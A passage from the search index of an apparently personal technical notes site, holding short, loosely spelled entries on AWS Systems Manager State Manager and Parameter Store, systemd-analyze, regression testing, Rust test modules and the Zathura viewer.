inventory","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#state-manager","title":"State manager","text":"<p>keep the state that u define on Ec2</p> <p>State Manager Association - Defines the state that you want ot maintain to your mangaged instances - Example port 22 must be closed,antivirus must be installed - Sepcyfie a schedule when this configuration is applaied - Uses SSM Documents to create an Association (e.g SSM Document to configure CW Agent )</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/ssm_parameter/","title":"SSM Paramaters store","text":"<p>Secure sotrage for configuration and secrets(optional encription with KMS) - Easy with SDK - Version tracking of configuration/secrets - Seciurity through IAM - Notifications with Amazon EventBridge - Integration with CloudFormation</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/ssm_parameter/#paramater-polices","title":"Paramater Polices","text":"<ul> <li>Allow expiration date to paramater <code>TTL</code><ul> <li>Force changing passowrds</li> </ul> </li> <li>Can assaing mulitiple policeies at a time</li> </ul> <pre><code>aws ssm get-paramaters --names /my-app/dev/db-url --with-decryption \n</code></pre>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/ssm_parameter/#ssm-paramater-store-hierarchy","title":"SSM Paramater Store Hierarchy","text":"<p>SSM</p>","tags":["ec2"]},{"location":"docs/systemd/systemd-analyze/","title":"systemd-analyze","text":"<pre><code>Display  the boot time of the machine\n</code></pre> <p>blame displays the individuals startup times of the services</p> <p>Example output</p> <pre><code>systemd-analyze blame\n\n4.842s NetworkManager-wait-online.service\n3.219s docker.service\n1.844s NetworkManager.service\n</code></pre>"},{"location":"docs/tests/black_box_tests/","title":"Black Box Test","text":"<p>Veryfie the behaviour of the system by examinating its output given a set if ubputs without having access to the details of ist internal implementaion</p> <p>Visual reggression tests</p> <p>Rust Tests</p>"},{"location":"docs/tests/rust_tests/","title":"rust tests","text":""},{"location":"docs/tests/rust_tests/#test-modules-in-rust","title":"Test modules in rust","text":"<p>In order to create a test in rust u create /test dir and particular modules to enable that - Configuration conditional chech - ==#[cfg(test)]== - Everything in this directory is compiled to the difften binariers</p> <p>[!quote] visual-reggression_tests port 0</p>"},{"location":"docs/tests/visual-reggression_tests/","title":"visual-reggression tests","text":""},{"location":"docs/tests/visual-reggression_tests/#visual-reggression","title":"Visual reggression","text":"<ul> <li>It\u2019s implemented by taking screenshots and compering them to one     antoher<ul> <li>Baseline is a last known good state of the app </li> </ul> </li> </ul> <p>[!quote]</p>"},{"location":"docs/tools/zathura/","title":"zathura","text":"<p>List of usefull shortcats for the dosc Zathura keybindings</p>"},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/archive/2023/","title":"2023","text":""},{"location":"blog/category/posts/","title":"posts","text":""}]}